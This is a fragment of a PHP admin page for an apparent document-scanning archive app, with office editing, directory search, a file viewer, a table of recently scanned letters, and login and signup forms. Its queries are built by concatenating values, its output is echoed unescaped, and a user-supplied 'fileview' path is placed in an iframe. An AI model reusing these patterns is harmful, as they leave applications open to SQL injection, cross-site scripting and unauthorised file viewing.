					echo "	<td><input type='Button' value='Edit' class='inp-sty c' onclick='myedit(\"usrname\")'></td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "		Office : ";
					echo "	</td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "	<select name='office' id='office' class='inp-sty' disabled>";
					echo "		<option>".$offrow['dtsname']."</option>";
					$sql = mysqli_query($con,"select * from office where name!='".$offrow['dtsname']."'");
					$num = mysqli_num_rows($sql);
					
					for($i=0;$i<$num;$i++) {
						$rows = mysqli_fetch_row($sql);
						echo "	<option>".$rows[1]."</option>";
					}
					echo "	</select>";
					echo "	</td>";
					echo "	<td><input type='Button' value='Edit' class='inp-sty c' onclick='myedit(\"office\")'></td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "		Position : ";
					echo "	</td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "	<select name='position' id='usrpos' class='inp-sty' disabled>";
					$sql = mysqli_query($con,"select * from pos where office='".$offrow['dtsname']."'");
					$num = mysqli_num_rows($sql);
					
					for($i=0;$i<$num;$i++) {
						$rows = mysqli_fetch_assoc($sql);
						$attr = "";
						if($offrow['position'] == $rows['name']) $attr="selected";
						echo "	<option $attr>".$rows['name']."</option>";
					}
					echo "	</select>";
					echo "	</td>";
					echo "	<td><input type='Button' value='Edit' class='inp-sty c' onclick='myedit(\"usrpos\")'></td>";
					echo "</tr>";
					echo "</table>";
					echo "</form>";
				} else msg("err","Please Input A Valid Email");
			}
			echo "
				</div>
				</div>
				</div>
				</div>
			";
		}
	} else if(isset($_GET["viewdrct"])) {
		if(isset($_POST["search"])) {
			$srch	= sanitizeString($con,$_POST["search"]);
		} else $srch	= "";
		if($srch != "") {
			$inthis	= " where name like '%$srch%' || location like '%$srch%' || info like '%$srch%' || status like '%$srch%' || code like '%$srch%' ";
		} else $inthis	= "";
		
		$sql = mysqli_query($con,"select * from office $inthis limit 15");
		$num = mysqli_num_rows($sql);
		
		echo '
			<div class="container">
			<div class="row">
			<div class="col-md-3"></div>
			<div class="col-md-6 text-center">
		';
		echo "
			<form action='admin.php?viewdrct' method='post'>
				<input type='text' placeholder='Search' onkeyup='myajax.fetchdata(event,\'srch\',\'\')' style='display: inline-block;' name='search' class='inp-sty'>
				<input type='submit' value='Go' class='inp-sty' style='display: inline-block;width: 50px;'>
			</form>
		";
		echo '
			<table class="table table-striped">
				<tr>
					<td style="background: #ccc;">Office No</td>
					<td style="background: #ccc;">Name</td>
					<td style="background: #ccc;">Parent</td>
					<td style="background: #ccc;">Positions</td>
					<td style="background: #ccc;">Minute</td>
					<td style="background: #ccc;">Position Limit</td>
				</tr>
		';
		for($i=0;$i<$num;$i++) {
			$rows	= mysqli_fetch_assoc($sql);
			$possql	= mysqli_query($con,"select * from pos where office='".$rows['name']."'");
			$posnum	= mysqli_num_rows($possql);
			echo "<tr>";
			echo "<td>".$rows['code']."</td>";			
			echo "<td>".$rows['name']."</td>";			
			echo "<td>".$rows['parent']."</td>";
			echo "<td>";
			for($j=0;$j<$posnum;$j++) {
				$posrow	= mysqli_fetch_assoc($possql);
				if($j!=0) echo ", ";
				echo $posrow["name"];
			}
			echo "</td>";
			$minsql	= mysqli_query($con,"select * from minutes where type='office' && name='".$rows['name']."'");
			$minrow	= mysqli_fetch_assoc($minsql);
			echo "<td>";
			echo "<a target='_blank' href='admin.php?eop=$user&fileview=minutes/".$minrow['loc']."'>View</a>";
			echo "</td>";
			echo "<td>";
			echo $rows['poslim'];
			echo "</td>";
			echo "</tr>";
		}
		echo '
			</table>
			</div>
			</div>
			</div>
		';

	} else if(isset($_GET["fileview"])) {
			$file = sanitizeString($con,$_GET["fileview"]);
			echo "
				<div class='iframecont'>
					<iframe src='$file'>
					</iframe>
				</div>
			";
			logthis($con,$user,"file viewed","$file","$office");
	} else if(isset($_GET["viewstats"])) {
		echo "
			<div class='right-container'>
				<div class='container'>
					<div class='row'>
						<div class='col-md-12 col-xs-12 text-center'>
							";
							include_once "stats.php";
							echo "
						</div>
					</div>
				</div>
			</div>
		";
	} else {
?>
       <div class="right-container">
         <div class="container">
          <div class="row">
			<div class="container">
				<div class="row">
					<div class="col-md-12 col-xs-12 text-center">
						<div style='text-align: center;'>
							<form action='admin.php' method='post'>
								<input type='text' placeholder='Search' onkeyup='myajax.fetchdata(event,\'srch\',\'\')' style='display: inline-block;' name='search' class='inp-sty'>
								<input type='submit' value='Go' class='inp-sty' style='display: inline-block;width: 50px;'>
							</form>
						</div>
						<table class="table table-bordered tbl-pos">
							<tbody>
								<?php
									if(isset($_POST["search"])) {
										$srch	= sanitizeString($con,$_POST["search"]);
									} else $srch = "";
									$inthis = " where status!='empty' ";
									if($srch != "")
										$inthis .= " && (name like '%$srch%' || source like '%$srch%' || user like '%$srch%' || subject like '%$srch%' || destin like '%$srch%' || bound like '%$srch%' || type like '%%$srch%' || descr like '%$srch%' || ctime like '%$srch%' || scantime like '%$srch%' || fromm like '%$srch%' || number like '%$srch%' || odate like '%$srch%' || cal like '%$srch%') ";

									$sqlval	= "select * from printform $inthis ";
									
									$sqlval	.= " order by id desc limit 12";
									//echo "$sqlval";
									$sql	= mysqli_query($con,$sqlval);
									$num	= mysqli_num_rows($sql);
									if($num < 1)
										echo "Nothing Found";
									else {
									echo '
										<thead style="text-align: center;">
											<th colspan="11">Recently Scanned</th>
										</thead>
										<tr>
											<td class="text-center">No</td>
											<td class="text-center">FileName</td>
											<td class="text-center">Subject</td>
											<td class="text-center">From</td>
											<td class="text-center">  &nbsp; To &nbsp; </td>
											<td class="text-center">Type</td>
											<td class="text-center">Category</td>
											<td class="text-center">Date</td>
											<td class="text-center">Scan Time</td>
											<td class="text-center">Action</td>
										</tr>
									';
										for($i=0;$i<$num;$i++) {
											$rows = mysqli_fetch_assoc($sql);
											
											if(getNum($con,"office where name='$office' && parent='None'") > 0)
												if(getNum($con,"office where (name='".$rows['source']."' || name='".$rows['destin']."') && parent like '%$office%'") < 1)
													continue;
											
											if(getNum($con,"lettercat where type='".$rows["bound"]."'") > 0)
												$code = decode($rows["type"]);
											else $code = ".";
											
											echo "
											<tr class='text-center'>
												<td>".$rows["number"]."</td>
												<td>".$rows["name"]."</td>
												<td>".$rows["subject"]."</td>
												<td>".$rows["source"]."<br />".$rows["user"]."</td>
												<td>".$rows["destin"]."</td>
												<td>".$rows["type"]."</td>
												<td>".$rows["bound"]."</td>
												<td>".$rows["odate"]."</td>
												<td>".$rows["scantime"]."</td>
												<td><a target='_blank' href='admin.php?fileview="."archives/".$rows["bound"]."/".$code."/".$rows["name"]."'>View</a></td>
											</tr>
											";
										}
									}
								?>
							</tbody>
						</table>
					</div>
				</div>
			</div>
          </div>
         </div>
       </div>

<?php
	}
	include_once "footer.php";
?>		
</body>
</html>
<?php
	} else {
		if(getNum($con,"cntrlpnl where id='0'") > 0) {
			echo "
				<div class='container'>
					<div class='row'>
						<div class='col-md-4'></div>
						<div class='col-md-6 text-center'>
							<form action='' method='post' autocomplete=off>
								<h1 class='cust form-btn-lg' style='margin-top: 50px;'>
									Easy
									<span class='sth-text'>Scan</span>
								</h1>
								<input type='password' name='pass' placeholder='Password' class='inp-sty form-btn-lg'>
								<input type='submit' name='lgnsbt' value='Login' class='inp-sty form-btn-lg btn-primary'>
							</form>
						</div>
					</div>
				</div>
			";
		} else {
			echo "
				<form action='' method='post' autocomplete=off>
					<input type='text' name='name' placeholder='Full Name'><br />
					<input type='email' name='eop' placeholder='email'><br />
					<input type='password' name='pass' placeholder='Password'><br />
					<input type='password' name='cpass' placeholder='Confirm Password'><br />
					<input type='submit' name='signupsbt' value='Signup'><br />
				</form>
			";
		}
	}

?>